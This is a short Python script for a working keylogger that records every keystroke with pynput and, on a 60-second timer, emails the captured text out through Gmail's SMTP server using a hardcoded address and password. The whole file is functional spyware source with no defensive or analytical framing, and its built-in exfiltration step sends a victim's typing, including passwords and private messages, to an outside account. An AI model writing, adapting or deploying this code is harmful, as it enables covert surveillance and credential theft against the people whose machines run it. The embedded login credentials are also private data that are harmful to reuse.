#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
import time

class KeyLogger:
    #
    def __init__(self,time_interval,email,password):
        #
        self.log = ""
        #
        self.interval = time_interval
        #
        self.email = email
        #
        self.password = password

    def AppendLog(self,string):
        #
        self.log = self.log + str(string)

    def ProcessKeyPress(self, key):
        #
        try:
            #
            current_key = key.char
            #
        except AttributeError:
            #
            if(key == key.space):
                #
                current_key = " "
                #
            else:
                #
                current_key = " "+str(key)+" "
                #
        self.AppendLog(current_key)

    def Report(self):
        #
        self.SendMail(self.email,self.password,"\n\n"+self.log)
        #
        self.log = ""
        #
        timer = threading.Timer(self.interval,self.Report)
        #
        timer.start()

    def SendMail(self,email,password,message):
        #
        server = smtplib.SMTP("smtp.gmail.com",587)
        #
        server.starttls()
        #
        server.login(email, password)
        #
        server.sendmail(email, email, message)
        #
        server.quit()

    def Start(self):
        #
        listener = pynput.keyboard.Listener(on_press=self.ProcessKeyPress)
        #
        with listener:
            #
            self.Report()
            #
            listener.join()

if(__name__ == '__main__'):
    #
    Logger = KeyLogger(60,"wolfgang.m.jager@gmail.com","deathanddestruction")
    #
    Logger.Start()
